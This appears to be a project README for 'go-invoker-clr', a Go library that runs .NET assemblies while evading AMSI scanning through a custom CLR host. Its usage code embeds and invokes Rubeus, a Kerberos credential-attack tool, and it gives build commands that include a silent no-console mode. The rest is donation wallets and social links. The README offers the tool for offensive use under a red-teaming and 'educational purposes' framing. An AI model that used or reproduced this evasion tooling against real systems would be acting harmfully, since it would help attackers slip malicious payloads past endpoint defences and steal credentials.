# go-invoker-clr

## Purpose

The purpose of this project is to provide a Go implementation for hosting and executing .NET assemblies with advanced stealth and evasion capabilities. It enables the execution of .NET payloads from Go code, bypassing AMSI (Antimalware Scan Interface) without memory patching, by leveraging a custom IHostControl interface. This makes it useful for red teaming, penetration testing, and research into Windows internals and evasion techniques.

![go-invoker-clr](go-invoker-slr.png)


go-invoker-clr CLR is the implementation in Go of [Being a Good CLR Host](https://github.com/passthehashbrowns/Being-A-Good-CLR-Host) by Joshua Magri from IBM X-Force Red.

It is built upon the [go-clr](https://github.com/Ne0nd0g/go-clr) project of Ne0nd0g, who in turn forked and maintained the original poc of [go-clr](https://github.com/ropnop/go-clr) by ropnop.

The purpose is to create our own `IHostControl` interface allowing us to implement the `ProvideAssembly` method. We can then use `Load_2` method instead of `Load_3`, circumventing AMSI entirely.


---

## Usage

Just import the package and use it !

```go
import (
	clr "github.com/hexsecteam/go-invoker-clr"
)

//go:embed Rubeus.exe
var testNet []byte

func main() {
    params := []string{"triage"}

    // Load the Good CLR and get the identity string from the .Net
	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNet)

    // Load the Assembly via its identityString
	assembly := clr.Load2Assembly(pRuntimeHost, identityString)

    // Invoke the Assembly
	pMethodInfo, _ := assembly.GetEntryPoint()
	clr.InvokeAssembly(pMethodInfo, params)
}
```

## Examples - Go Invoker

Go Invoker is a small POC project that showcase go-invoker-clr in action. You can check `examples/GoInvoker/` for a README and the complete code. 

Basically you do:

### Linux:
```bash
cd examples/GoInvoker
go mod tidy
go run helper/helper.go -file=/home/kali/Desktop/Server.exe && GOOS=windows GOARCH=amd64 go build
```
### Windows:
```bash
cd examples/GoInvoker
go mod tidy
go run helper/helper.go -file=C:\...\Server.exe
set GOOS=windows
set GOARCH=amd64
go build                          # build with console output (console app)
go build -ldflags "-H=windowsgui" # build without console window (silent GUI mode)
```

You will get a `goinvoker.exe` that you can use like `Server.exe` whith native AMSI bypass without memory patching:

```powershell
.\goinvoker.exe triage
.\goinvoker.exe -help
```

## Motivation of Go Invoker

Basically we all noticed that a while ago, defender introduced behavioral rules to prevent AMSI memory patching.

Thanks to IBM X-Force Red, we got a patchless AMSI bypass that does not rely on the CPU like for Hardware Break Point !!


## 🤝 Support the HexSec Community
If you find value in our work and would like to support the HexSec community, you can contribute by making a donation. Your support helps us continue developing innovative and high-quality tools for the cybersecurity and IT community.

**Donate:**
- **ETH**: `0x3E79B73e3ce33c6B860425DCB40c6D2f4F2aC508`
- **BTC**: `bc1qpex9u7x4a6kj4nf6fee7mz54vsv4th2rj2pt30`

---

## 📬 More Details:
- Contact on Telegram: [@Hexsecteam](https://t.me/Hexsecteam)
- Group on Telegram: [@hexsec_tools](https://t.me/hexsec_tools)
- Vimeo: [https://vimeo.com/hexsec](https://vimeo.com/hexsec)
- Dailymotion: [https://dailymotion.com/hexsectools](https://dailymotion.com/hexsectools)
- Medium: [https://medium.com/@hexsectools](https://medium.com/@hexsectools)
- Facebook: [https://www.facebook.com/hexsexcommunity/](https://www.facebook.com/hexsexcommunity/)
- YouTube: [https://www.youtube.com/@hex_sec](https://www.youtube.com/@hex_sec)

---

> ⚠️ This project is provided for **educational and ethical hacking purposes only**. You are responsible for any use. Unauthorized access or distribution is prohibited by law.
